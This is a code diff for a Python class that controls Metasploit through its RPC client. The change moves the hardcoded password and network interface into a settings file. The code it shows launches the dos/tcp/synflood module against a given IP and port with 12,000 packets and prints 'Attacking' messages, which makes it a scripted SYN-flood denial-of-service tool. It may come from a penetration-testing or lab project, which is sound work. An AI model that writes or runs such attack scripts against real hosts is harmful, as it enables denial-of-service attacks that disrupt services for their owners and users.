@@ -1,11 +1,11 @@
 from pymetasploit3.msfrpc import MsfRpcClient
-from packet import send_packet
+from settings import METASPLOIT_PASSWORD, NETWORK_ADAPTER_NAME
 
 class Metasploit:
     def __init__(self):
-        # Start metasploit rpc server with msfrpcd -P kali
+        # Start metasploit rpc server with msfrpcd -P your_password
         # The MsfRpcClient class provides the core functionality to navigate through the Metasploit framework.
-        self.client = MsfRpcClient('kali', ssl=True)
+        self.client = MsfRpcClient(METASPLOIT_PASSWORD, ssl=True)
         for console in self.client.consoles.list:
             self.client.consoles.console(console["id"]).destroy()
 
@@ -17,7 +17,7 @@ class Metasploit:
         exploit = self.client.modules.use('auxiliary', 'dos/tcp/synflood')
         exploit['RHOSTS'] = ip
         exploit['RPORT'] = port
-        exploit['INTERFACE'] = 'wlan0'
+        exploit['INTERFACE'] = NETWORK_ADAPTER_NAME
         exploit['NUM'] = 12000
         print(exploit.description)
         print(f'Attacking {ip} on port {port}')
